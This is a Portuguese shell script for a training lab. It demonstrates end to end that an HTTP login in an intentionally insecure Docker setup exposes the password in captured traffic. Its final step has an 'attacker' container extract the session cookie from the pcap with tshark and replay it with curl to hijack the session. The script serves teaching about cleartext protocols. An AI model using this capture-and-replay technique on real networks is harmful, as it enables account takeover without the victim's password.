#!/bin/sh
# Módulo 1 - demonstração de ponta a ponta:
#   captura no firewall -> cliente faz login por HTTP -> análise mostra a senha em claro.
# Rodar na raiz do projeto, com o laboratório no cenário inseguro (make inseguro).
set -e
NOME="${NOME:-m1-login-http}"
DC="docker compose"
DONO="-e HOST_UID=$(id -u) -e HOST_GID=$(id -g)"

echo "== 1) Iniciando captura no firewall (lado dos clientes, porta 80)"
$DC exec $DONO captura sh /captura/capturar.sh iniciar "$NOME" clientes tcp port 80

echo "== 2) cliente-comum faz login por HTTP (como um navegador faria)"
$DC exec cliente-comum sh -c '
  rm -f /tmp/cookies
  echo "--- POST /login"
  curl -s -o /dev/null -w "HTTP %{http_code}\n" -c /tmp/cookies \
       -A "Mozilla/5.0 (cliente-comum)" \
       -d "usuario=alice&senha=SenhaSecreta123" http://web.lab/login
  echo "--- GET /area-protegida usando o cookie recebido"
  curl -s -b /tmp/cookies -A "Mozilla/5.0 (cliente-comum)" http://web.lab/area-protegida; echo
'

echo "== 3) Encerrando captura"
$DC exec $DONO captura sh /captura/capturar.sh parar

echo "== 4) O que um atacante no caminho consegue ler:"
$DC exec captura sh /captura/analisar_http.sh "/evidencias/$NOME.pcap" | tee "evidencias/$NOME-analise.txt"

echo
echo "== 5) Impacto: o cliente-admin (fazendo papel de atacante) reaproveita o cookie capturado"
COOKIE=$($DC exec -T captura tshark -r "/evidencias/$NOME.pcap" -Y http.set_cookie \
         -T fields -e http.set_cookie 2>/dev/null | head -1 | cut -d';' -f1)
echo "cookie extraído do .pcap: $COOKIE"
$DC exec -T cliente-admin curl -s -H "Cookie: $COOKIE" http://web.lab/area-protegida; echo
echo "-> sessão sequestrada SEM saber a senha (só lendo o tráfego HTTP)."

echo
echo "Arquivos gerados: evidencias/$NOME.pcap (abrir no Wireshark) e evidencias/$NOME-analise.txt"
